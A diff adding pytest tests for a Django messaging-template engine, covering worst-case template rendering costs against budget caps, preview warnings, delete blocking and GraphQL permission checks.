+"""The costliest date format a row may write: twenty characters, each a full RFC 5322 date."""
+
+
+def _loop(lines: list[str], sequence: str = "items") -> str:
+    return "{% for i in " + sequence + " %}\n" + "\n".join(lines) + "\n{% endfor %}"
+
+
+def _deep_ifs(count: int) -> list[str]:
+    return [("{% if " + DEEP + " %}{% endif %}") * 15] * count
+
+
+DATED = [("{% with x=d|date:" + R20 + " %}{% endwith %}") * 10]
+CHAINS = ["{% if " + " or ".join(["x == y"] * 90) + " %}{% endif %}"] * 3
+"""Comparisons of two 10,000-character values that differ in their last character (the Django review's case)."""
+LINE = "{% for i in few %}{% with " + " ".join(f"v{index}=d|date:{R20}" for index in range(6)) + \
+    " %}{% endwith %}{% endfor %}"
+"""The costliest subject a 255-character column holds: six such dates an item, as many items as its pass allows."""
+TIMED_VALUES = {"items": [0] * 500, "a": {}, "d": "2026-11-24T15:30:00+00:00"}
+
+
+def _dated(first: int, count: int) -> str:
+    """A loop printing each item's date in ``count`` distinct 20-character formats, none of them reached."""
+
+    lines = [f"{{{{ i.when|date:'rrrrrrrrrrrrrrrrr{index:03d}' }}}}" for index in range(first, first + count)]
+    return "{% for i in items %}{% if forloop.counter > 600 %}\n" + "\n".join(lines) + "\n{% endif %}{% endfor %}"
+
+
+DATED_VALUES = {"items": [{"when": "2026-11-24T15:30:00+00:00"}] * 500}
+"""500 items whose date the dated row prints in 560 formats: once a format in prepare(), never once a value."""
+TIMED_VARIABLES = {"items.*": "x", DEEP: "x", "d": "x"}
+
+PASS_CASES: dict[str, tuple[dict[str, Any], dict[str, Any]]] = {
+    "q1-deep-operands": ({"source": _loop(_deep_ifs(31))}, TIMED_VALUES),
+    "q11b-combined": ({"source": _loop(DATED + _deep_ifs(31))}, TIMED_VALUES),
+    "p11-outputs-outside-loops": ({"source": "\n".join(["{{ q }}" * 29] * 10), "variables": {"q": "x"}},
+                                  {"q": '"' * 10_000}),
+}
+
+
+def _pass_case(name: str) -> tuple[TemplateWalk, dict[str, Any]]:
+    rows, values = PASS_CASES[name]
+    template = _mail(rows["source"], rows.get("variables", TIMED_VARIABLES), format="html", text_source="x")
+    return _walk(template), values
+
+
+ADMITTED_PREVIEWS = ("admitted", "review", "dated")
+
+
+def _preview_cases() -> dict[str, Any]:
+    """The costliest previews, admitted and refused.
+
+    ``admitted``: a q11b loop in both forms beside Markdown rows of ``*_`` (the costliest row pattern) inside
+    ``{% comment %}`` (a full row check for one node, q4). ``review``: the Django review's case, ``==`` chains on
+    10,000-character values and a third hidden row up to the walk's 150,000 characters, with the costliest
+    subject its pass admits (50 items of six dates; the 500 list items are shared). ``review-subject``: the same
+    with the review's subject over every item, which the subject's budget stops. ``refused``: a walk reaching
+    150,000 characters of ``*_`` rows whose HTML forms pass the text cap only when the walk is over.
+    """
+
+    star_lines = [("*_" * 499)[:999]] * 49
+    commented = "{% comment %}\n\n" + "\n".join(star_lines) + "\n\n{% endcomment %}"
+    for index in range(3):
+        # Just under a third of the walk's 150,000 characters each, so all three are checked, then refused.
+        _row("part", f"star{index}", source="\n".join([line[:996] for line in [*star_lines, star_lines[0]]]))
+    for index in range(2):
+        _row("part", f"hidden{index}", source=commented)
+    hidden = '\n{% include "parts/hidden0" only %}{% include "parts/hidden1" only %}'
+    loop = _loop(DATED + _deep_ifs(30))
+    heavy = _loop(DATED + _deep_ifs(10) + CHAINS)
+    used = len(heavy + hidden) + len(heavy) + 2 * len(commented)
+    _row("part", "hidden2", source="{% comment %}\n\n" + "\n".join(star_lines)[: 150_000 - used - 300]
+         + "\n\n{% endcomment %}")
+    review = {**TIMED_VALUES, "x": "a" * 9_999 + "b", "y": "a" * 9_999 + "c"}
+    return {
+        "admitted": _mail(
+            loop + hidden, TIMED_VARIABLES, format="html", text_source=loop, key="tests.admitted",
+            # The two includes charge two of the pass's 500 iterations.
+            sample={**TIMED_VALUES, "items": [0] * 498},
+        ),
+        "review": _mail(
+            heavy + hidden + '{% include "parts/hidden2" only %}',
+            {**TIMED_VARIABLES, "x": "x", "y": "x", "few.*": "x"},
+            format="html", text_source=heavy, key="tests.review", subject=LINE,
+            sample={**review, "items": [0] * 450, "few": [0] * 50},
+        ),
+        "review-subject": _mail(
+            heavy + hidden + '{% include "parts/hidden2" only %}', {**TIMED_VARIABLES, "x": "x", "y": "x"},
+            format="html", text_source=heavy, key="tests.review_subject", subject=LINE.replace(" few ", " items "),
+            sample={**review, "items": [0] * 497},
+        ),
+        "refused": _mail("\n\n".join(f'{{% include "parts/star{index}" only %}}' for index in range(3)),
+                         key="tests.refused"),
+        "dated": _mail(_dated(0, 280), {"items.*.when": "x"}, format="html", text_source=_dated(300, 280),
+                       key="tests.dated", sample=DATED_VALUES),
+    }
+
+
+@pytest.fixture
+def work(monkeypatch: pytest.MonkeyPatch) -> dict[str, list[Any]]:
+    """Record what walks and renders do: each tree's nodes, outputs and text, and what each pass charged."""
+
+    seen: dict[str, list[Any]] = {"trees": [], "passes": []}
+    _recording(monkeypatch, _TreeWalker, "close", lambda walker, tree: seen["trees"].append(
+        (str(tree.form), tree.nodes, tree.outputs, tree.text)))
+    _recording(monkeypatch, RenderBudget, "spend", lambda budget: seen["passes"].append(budget))
+    return seen
+
+
+def _charges(budgets: list[RenderBudget]) -> list[tuple[int, int, int]]:
+    """What each pass spent: iterations, loop output and filter input."""
+
+    return [
+        (budget.limits["iterations"] - budget.left["iterations"], budget.limits["output"] - budget.left["output"],
+         budget.limits["filter_input"] - budget.left["filter_input"])
+        for budget in budgets
+    ]
+
+
+LINES = [("subject", 1, 0, 9), ("preheader", 1, 0, 11)]
+PASS_WORK = {
+    # Each tree's (piece, nodes, outputs, text); each pass's (iterations, loop output, filter input) charged.
+    "q1-deep-operands": ([("html", 976, 4, 133), ("text", 4, 0, 1), *LINES], [(0, 0, 0), (500, 16_000, 0), (0, 0, 0)]),
+    "q11b-combined": (
+        [("html", 997, 4, 134), ("text", 4, 0, 1), *LINES], [(0, 0, 0), (500, 16_500, 500_000), (0, 0, 0)],
+    ),
+    "p11-outputs-outside-loops": (
+        [("html", 312, 294, 110), ("text", 4, 0, 1), *LINES], [(0, 0, 0), (0, 0, 0), (0, 0, 0)],
+    ),
+}
+"""The work of the costliest passes: at the node, output and budget caps, which bound their CPU."""
+
+
+@pytest.mark.parametrize("name", list(PASS_CASES))
+def test_the_costliest_pass_does_bounded_work(plain: Any, kit: Any, work: dict[str, list[Any]], name: str) -> None:
+    """D4: the work of the passes ``test_pass_time`` times, as the walk counts it and the budget charges it."""
+
+    del plain
+    walk, values = _pass_case(name)
+    with system_context(reason="tests.messaging_templates.render.work"):
+        walk.render(values, kit=kit)
+    trees, charges = PASS_WORK[name]
+    assert work["trees"] == trees and _charges(work["passes"]) == charges
+    # The charges are counted against the budget's own limits: the costliest cases reach them.
+    assert RenderBudget().limits == {"iterations": 500, "output": 200_000, "filter_input": 500_000}
+    assert RenderBudget.for_lines().limits == {"iterations": 50, "output": 20_000, "filter_input": 50_000}
+
+
+PREVIEW_WORK: dict[str, tuple[int, list[tuple[str, int, int, int]], list[tuple[int, int, int]]]] = {
+    # Source the walk checks; each tree's (piece, nodes, outputs, text); each pass's charges, as PASS_WORK.
+    "admitted": (
+        130_977, [("html", 971, 4, 134), ("text", 956, 0, 32), *LINES],
+        [(0, 0, 0), (500, 15_936, 498_000), (498, 15_936, 498_000)],
+    ),
+    "review": (
+        149_981, [("html", 899, 4, 117), ("text", 882, 0, 15), ("subject", 8, 0, 0), LINES[1]],
+        [(50, 0, 30_000), (453, 6_750, 450_000), (450, 6_750, 450_000)],
+    ),
+    "review-subject": (
+        149_981, [("html", 899, 4, 117), ("text", 882, 0, 15), ("subject", 8, 0, 0), LINES[1]], [(51, 0, 30_000)],
+    ),
+    "refused": (149_861, [("html", 19, 4, 498_344), ("text", 12, 0, 49_953), *LINES], []),
+    "dated": (
+        23_322, [("html", 578, 284, 382), ("text", 568, 280, 281), *LINES], [(0, 0, 0), (500, 0, 0), (500, 0, 0)],
+    ),
+}
+"""The work of the costliest previews: the walk's 150,000 characters, its caps, and every pass's budget."""
+
+
+def test_prepare_asks_each_format_once_whatever_the_number_of_values(
+    plain: Any, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Section 3: prepare() costs a constant per declared path per value; formats are judged once each."""
+
+    del plain
+    calls: list[str] = []
+    _recording(monkeypatch, walker_module, "date_filter", lambda value, name: calls.append(name))
+    walk = _walk(_unsaved(format="html", source=_dated(0, 280), text_source=_dated(300, 280),
+                          variables={"items.*.when": "x"}))
+    assert {path: len(formats) for path, formats in walk.date_paths.items()} == {("items", "*", "when"): 560}
+    for items in (1, 500):
+        calls.clear()
+        with translation.override("en"):
+            walk.prepare({"items": DATED_VALUES["items"][:items]})
+        assert len(calls) == 560, items
+    calls.clear()
+    with translation.override("en"):
+        walk.prepare({"items": [{"when": "2026-11-24T15:30:00+00:00"}, {"when": "2026-11-24"}] * 250})
+    assert len(calls) == 2 * 560  # each format once for each kind of moment met: a datetime and a bare date
+
+
+def test_the_costliest_preview_does_bounded_work(plain: Any, kit: Any, work: dict[str, list[Any]]) -> None:
+    """D4: the work of the previews ``test_preview_time`` times: source checked, trees walked, passes charged."""
+
+    del plain
+    for name, template in _preview_cases().items():
+        work["trees"].clear()
+        work["passes"].clear()
+        with system_context(reason="tests.messaging_templates.render.work"):
+            walk = TemplateWalker().judge(template, MessageTemplate.objects)
+            preview = template.preview(kit=kit)
+        source = sum(len(row.source) + len(row.text_source) for row in walk.rows.values())
+        assert (preview.rendered is not None) is (name in ADMITTED_PREVIEWS), preview.warnings
+        assert (source, work["trees"][len(work["trees"]) // 2:], _charges(work["passes"])) == PREVIEW_WORK[name]
+
+
+@TIMED
+@pytest.mark.parametrize("name", list(PASS_CASES))
+def test_pass_time(plain: Any, kit: Any, name: str) -> None:
+    """One pass of the costliest rows the caps admit takes under a second of CPU (passes 2 to 4, one heavy)."""
+
+    del plain
+    walk, values = _pass_case(name)
+    started = time.process_time()
+    with system_context(reason="tests.messaging_templates.render.timed"):
+        walk.render(values, kit=kit)
+    spent = time.process_time() - started
+    print(f"pass CPU {name} {spent:.3f}s load {os.getloadavg()[0]:.0f}")  # noqa: T201 -- the report quotes it
+    assert spent < 1.0
+
+
+@TIMED
+def test_preview_time(plain: Any, kit: Any) -> None:
+    """The costliest previews and renders the caps admit take under two seconds of CPU: walk, prepare(), passes."""
+
+    del plain
+    spent: dict[str, float] = {}
+    for name, template in _preview_cases().items():
+        started = time.process_time()
+        with system_context(reason="tests.messaging_templates.render.timed"):
+            preview = template.preview(kit=kit)
+        spent[name] = round(time.process_time() - started, 3)
+        assert (preview.rendered is not None) is (name in ADMITTED_PREVIEWS), preview.warnings
+        if name in ADMITTED_PREVIEWS:
+            started = time.process_time()
+            with system_context(reason="tests.messaging_templates.render.timed"):
+                template.render(template.sample, kit=kit)
+            spent[f"{name} render"] = round(time.process_time() - started, 3)
+    print(f"preview CPU {spent} load {os.getloadavg()[0]:.0f}")  # noqa: T201 -- the report quotes it
+    assert max(spent.values()) < 2.0
+
+
+# ---------- preview, its warnings and its read ----------
+
+
+def test_preview_warnings(plain: Any, kit: Any) -> None:
+    del plain
+    template = _mail(
+        "{{ name }}", {"name": "x", "spare": "x", "unsubscribe_url": "x"},
+        subject="s" * 61, preheader="", sample={"name": "Ana", "unsubscribe_url": "https://example.test/stop"},
+    )
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        preview = template.preview(kit=kit)
+    assert {warning.code for warning in preview.warnings} == {
+        TemplateWarningCode.SUBJECT_LENGTH, TemplateWarningCode.PREHEADER, TemplateWarningCode.UNUSED_VARIABLE,
+        TemplateWarningCode.STOP_LINK,
+    }
+    assert any("spare" in warning.detail for warning in preview.warnings)
+    empty = _mail("{% if name %}{% endif %}", {"name": "x"}, key="tests.empty", sample={"name": ""})
+    big = _mail("{{ name }}" * 11, {"name": "x"}, key="tests.big", sample={"name": "x" * 9_999},
+                format="html", text_source="x")
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        assert TemplateWarningCode.PLAIN_TEXT in {warning.code for warning in empty.preview(kit=kit).warnings}
+        assert TemplateWarningCode.SIZE in {warning.code for warning in big.preview(kit=kit).warnings}
+
+
+def test_a_layout_previews_around_a_fixed_body_and_a_block_alone(plain: Any, kit: Any) -> None:
+    with system_context(reason="tests.messaging_templates.render.preview"):
+        layout = plain.preview(kit=kit)
+        block = _row("block", "card", source="<b>{{ title }}</b>", text_source="{{ title }}",
+                     variables={"title": "x"}, sample={"title": "Tuner"}).preview(kit=kit)
+    assert layout.rendered is not None and "<title>A message in this layout</title>" in layout.rendered.html
+    assert "A template writes its message here." in layout.rendered.plain_text
+    assert block.rendered is not None and block.rendered.html == "<b>Tuner</b>"
+    assert block.warnings == []
+
+
+def test_deleting_an_included_block_or_part_is_refused_while_its_key_would_stop_resolving(plain: Any) -> None:
+    del plain
+    part = _row("part", "used", source="Used.")
+    _row("part", "used", language="es", source="Usado.")
+    _row("part", "unused", source="Unused.")
+    _mail('{% include "parts/used" only %}')
+    with system_context(reason="tests.messaging_templates.render.delete"):
+        with pytest.raises(ValidationError, match="Other message templates use this part"):
+            part.delete()
+        MessageTemplate.objects.get(key="unused").delete()
+        MessageTemplate.objects.get(key="used", language="es").delete()
+
+
+def test_a_delete_checks_the_rows_naming_its_key_each_time(plain: Any, monkeypatch: pytest.MonkeyPatch) -> None:
+    """The delete preview and the pre_delete receiver each check the rows naming a key: no state outlives a call."""
+
+    del plain
+    part = _row("part", "shared", source="Shared.")
+    for index in range(3):
+        _mail('{% include "parts/shared" only %}' + f"\n\nNaming {index}.", key=f"tests.naming{index}")
+    checked: list[str] = []
+    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: checked.append(name))
+    with system_context(reason="tests.messaging_templates.render.delete"):
+        first = MessageTemplate.objects.get(pk=part.pk).delete_blocker()
+        second = MessageTemplate.objects.get(pk=part.pk).delete_blocker()
+    assert first is not None and first == second
+    assert len(checked) == 6
+
+
+def test_a_load_reports_what_a_deployment_row_breaks_and_completes(
+    plain: Any, kit: Any, caplog: pytest.LogCaptureFixture,
+) -> None:
+    """D1: a refusal reached only through a deployment's row is logged, not raised; a shipped defect fails the load."""
+
+    del plain
+    _row("layout", "shipped", is_baseline=True)
+    shipped = _row("part", "named", source="{{ who|default:'' }}", variables={"who": "x"}, is_baseline=True)
+    template = _row("template", "tests.loaded", source='{% include "parts/named" with who=name only %}',
+                    variables={"name": "x"}, layout="shipped", is_baseline=True)
+    with system_context(reason="tests.messaging_templates.render.load"):
+        override = MessageTemplate.objects.override(shipped)
+        override.source, override.variables = "{{ who }} {{ extra }}", {"who": "x", "extra": "x"}
+        override.save()  # past clean: the override asks for an argument the shipped template never passes
+        with caplog.at_level(logging.WARNING, logger="angee.messaging_templates.models"):
+            MessageTemplate.after_resource_load([template], tier="install", source="tests")
+        template.source += "\n\nMore."
+        template.full_clean()  # a baseline is judged among the shipped rows alone
+    (record,) = [record for record in caplog.records if record.name == "angee.messaging_templates.models"]
+    assert "tests.loaded (en)" in record.getMessage() and "parts/named (en)" in record.getMessage()
+    assert "which it was not passed" in record.getMessage()
+    with pytest.raises(ValidationError, match="which it was not passed"):
+        _render(template, {"name": "Ana"}, kit)
+    _row("part", "needy", source="{{ needed }}", variables={"needed": "x"}, is_baseline=True)
+    broken = _row("template", "tests.broken", source='{% include "parts/needy" only %}', layout="shipped",
+                  is_baseline=True)
+    with system_context(reason="tests.messaging_templates.render.load"), pytest.raises(
+            ValidationError, match="which it was not passed"):
+        MessageTemplate.after_resource_load([broken], tier="install", source="tests")
+
+
+_PREVIEW = """
+query($id: ID!, $kit: ID) {
+  message_template_preview(template: $id, brand_kit: $kit) {
+    rendered { subject preheader html plain_text language }
+    warnings { code detail }
+  }
+}
+"""
+
+
+def test_preview_is_an_administrators_read(plain: Any, kit: Any) -> None:
+    del plain
+    admin = create_platform_admin("messaging-templates-previewer")
+    member = create_user("messaging-templates-reader")
+    template = _mail("Hi {{ name }}, from {{ brand.name }}.", {"name": "x"}, sample={"name": "Ana"})
+    with system_context(reason="tests.messaging_templates.render.kit"):
+        other = BrandKit.objects.create(**{**ANGEE, "name": "Other"})
+    schema = addon_schema(messaging_templates_schema.schemas, "console")
+    variables = {"id": public_id_of(template), "kit": None}
+    preview = result_data(execute_schema(schema, _PREVIEW, variables, user=admin))["message_template_preview"]
+    assert preview["rendered"]["plain_text"] == "Hi Ana, from Acme.\n" and preview["warnings"] == []
+    themed = result_data(execute_schema(schema, _PREVIEW, {**variables, "kit": public_id_of(other)}, user=admin))
+    assert themed["message_template_preview"]["rendered"]["plain_text"] == "Hi Ana, from Other.\n"
+    refusals = {}
+    for name, refused in (("member", member), ("anonymous", AnonymousUser())):
+        (error,) = execute_schema(schema, _PREVIEW, variables, user=refused).errors
+        refusals[name] = (error.extensions["code"], error.message)
+    assert refusals["member"][0] == "PERMISSION_DENIED"
+    assert refusals["anonymous"] == ("PERMISSION_DENIED", "Authentication required.")
+    broken = _mail("{% if %}", key="tests.broken")
+    result = result_data(execute_schema(schema, _PREVIEW, {"id": public_id_of(broken), "kit": None}, user=admin))
+    assert result["message_template_preview"]["rendered"] is None
+    assert result["message_template_preview"]["warnings"][0]["code"] == "RENDER_ERROR"
+    assert re.search(r"does not compile", result["message_template_preview"]["warnings"][0]["detail"])
+
+
+_UPDATE = """
+mutation($id: String!, $set: message_templates_set_input!) {
+  update_message_templates_by_pk(pk_columns: {id: $id}, _set: $set) { id }
+}
+"""
+_OVERRIDE = "mutation($id: ID!) { override_message_template(template: $id) { ok message id } }"
+_KEEP = "mutation($id: ID!) { keep_message_template_override(template: $id) { ok message id } }"
+
+
+def test_the_walk_runs_in_clean_after_the_permission_is_decided(
+    plain: Any, kit: Any, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The three confirmations (probes j, b, b2): save() never walks; the console update, override, keep and
+    preview decide the caller's permission before anything is lexed or compiled. The console insert, which
+    validates before it decides create, is the framework's to fix."""
+
+    del plain, kit
+    checked: list[str] = []
+    _recording(monkeypatch, TemplateWalker, "_check", lambda walker, row, name: checked.append(name))
+    own = _row("part", "own", source="{% if %}")  # save() of a row the walk refuses
+    with system_context(reason="tests.messaging_templates.render.save"):
+        own.source = "Still {% if %}"
+        own.save(update_fields=["source"])
+        assert checked == []
+        own.source = "Changed {% if %}"  # clean() walks what changed
+        with pytest.raises(ValidationError, match="does not compile"):
+            own.full_clean()
+        own.refresh_from_db()
+    assert checked
+    shipped = _row("part", "shipped", source="{% if %}", is_baseline=True)
+    schema = addon_schema(messaging_templates_schema.schemas, "console")
+    member = create_user("messaging-templates-writer")
+    cases: dict[str, tuple[str, dict[str, Any]]] = {
+        "update": (_UPDATE, {"id": public_id_of(own), "set": {"source": "{% if %} again"}}),
+        "override": (_OVERRIDE, {"id": public_id_of(shipped)}),
+        "keep": (_KEEP, {"id": public_id_of(own)}),
+        "preview": (_PREVIEW, {"id": public_id_of(own), "kit": None}),
+    }
+    refusals = {
+        ("update", "member"): ("PERMISSION_DENIED", "cannot write"),
+        ("update", "anonymous"): ("VALIDATION", "not found"),
+        ("override", "member"): ("PERMISSION_DENIED", "lacks 'create'"),
+        ("keep", "member"): ("PERMISSION_DENIED", "lacks 'write'"),
+        ("preview", "member"): ("PERMISSION_DENIED", "lacks 'preview'"),
+    }
+    for name, (document, variables) in cases.items():
+        for label, user in (("member", member), ("anonymous", AnonymousUser())):
+            checked.clear()
+            result = execute_schema(schema, document, variables, user=user)
+            assert checked == [], (name, label)
+            code, said = refusals.get((name, label), ("PERMISSION_DENIED", "Authentication required."))
+            (error,) = result.errors or [None]
+            assert error is not None and (error.extensions or {}).get("code") == code and said in error.message, (
+                name, label, result.errors)
+    with system_context(reason="tests.messaging_templates.render.save"):
+        assert MessageTemplate.objects.get(pk=own.pk).source == "Still {% if %}"
